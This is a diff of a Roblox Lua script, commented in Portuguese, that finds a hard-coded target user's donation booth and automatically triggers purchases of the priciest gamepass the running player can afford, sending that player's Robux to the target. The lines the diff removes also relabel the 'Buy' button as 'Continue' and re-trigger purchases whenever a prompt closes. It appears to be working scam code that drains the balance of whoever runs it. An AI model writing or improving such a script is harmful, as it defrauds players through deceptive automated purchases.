@@ -1,55 +1,71 @@
 -- Configuração
-local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"
-local Username = "Ian_wp27" -- definir o usuário alvo
-
--- Serviços
+local Username = "Ian_wp27" -- substitua pelo nome do jogador
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local MarketplaceService = game:GetService("MarketplaceService")
 local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
 local CoreGui = game:GetService("CoreGui")
-local RunService = game:GetService("RunService")
-
--- Remotes
 local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
 
--- Helpers
-local Player = Players.LocalPlayer
-local asset
-local userRobux = math.huge
+local player = Players.LocalPlayer
 
--- Pegar UserId
-local success, UserId = pcall(function()
+-- Pegar UserId do alvo
+local success, userId = pcall(function()
     return Players:GetUserIdFromNameAsync(Username)
 end)
-
-if not success or not UserId then
-    warn("Usuário inválido!")
+if not success or not userId then
+    warn("Usuário não encontrado")
     return
 end
 
--- Buscar Booth
-local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
+-- Pegar Booth do alvo
+local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(userId)
 if not Booth then
-    Player:Kick("Receiver not found!")
+    player:Kick("Receiver not found!")
     return
 end
 
--- Função de compra
-local function Purchase()
-    local range = 0
+-- Função para pegar o saldo atual
+local function GetUserRobux()
+    local ok, robux = pcall(function()
+        return Remotes.Function("GetUserRobux"):InvokeServer()
+    end)
+    if ok and type(robux) == "number" then
+        return robux
+    else
+        warn("Não foi possível obter saldo, usando 0")
+        return 0
+    end
+end
+
+-- Função para escolher o gamepass mais caro que o jogador consegue pagar
+local function GetBestAffordableAsset()
+    local userRobux = GetUserRobux()
+    local bestAsset = nil
+    local bestPrice = 0
+
     for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
         if v:GetAttribute("AssetType") == "Gamepass" and
-           not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, v:GetAttribute("AssetId")) then
+           not MarketplaceService:UserOwnsGamePassAsync(player.UserId, v:GetAttribute("AssetId")) then
             local price = v:GetAttribute("AssetPrice")
-            if price and price <= userRobux and price > range then
-                asset = v
-                range = price
+            -- Só considera se o preço for menor ou igual ao saldo atual
+            if price and price <= userRobux and price > bestPrice then
+                bestPrice = price
+                bestAsset = v
             end
         end
     end
 
+    return bestAsset, bestPrice
+end
+
+-- Função para comprar o gamepass selecionado
+local function Purchase()
+    local asset, price = GetBestAffordableAsset()
     if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
-        asset.Prompt:FireServer("", false, range)
+        asset.Prompt:FireServer(asset:GetAttribute("AssetId"), price)
+        print("Comprando:", asset.Name, "Preço:", price)
+    else
+        print("Nenhum gamepass disponível dentro do saldo atual.")
     end
 end
 
@@ -60,40 +76,12 @@ repeat
     task.wait(0.1)
 until PurchasePromptApp
 
--- Detecta quando a UI de compra é adicionada
+-- Dispara a compra quando a prompt aparecer
 PurchasePromptApp.ChildAdded:Connect(function(child)
     if child.Name == "Prompt" then
-        local footer = child:WaitForChild("AlertContents"):WaitForChild("Footer")
-        local content = footer:WaitForChild("FooterContent"):WaitForChild("Content")
-        local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
-        if RemainingBalanceText then
-            userRobux = tonumber(RemainingBalanceText.Text:match("(%d+)")) or math.huge
-            -- Adaptar para mobile: botão "Comprar" à esquerda
-            local buyButton = footer.Buttons:FindFirstChild("2")
-            if buyButton then
-                buyButton.ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
-                buyButton.Position = UDim2.new(0, 10, buyButton.Position.Y.Scale, buyButton.Position.Y.Offset) -- move para esquerda
-            end
-        end
-    end
-end)
-
--- Detecta quando a UI de compra é removida
-PurchasePromptApp.ChildRemoved:Connect(function(child)
-    if child.Name == "Prompt" then
-        if asset and not MarketplaceService:UserOwnsGamePassAsync(Player.UserId, asset:GetAttribute("AssetId")) then
-            Purchase()
-        end
-    end
-end)
-
--- Evento de doação
-Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
-    if a == UserId then
-        userRobux = userRobux - robux
         Purchase()
     end
 end)
 
--- Compra inicial
+-- Primeira tentativa de compra
 Purchase()
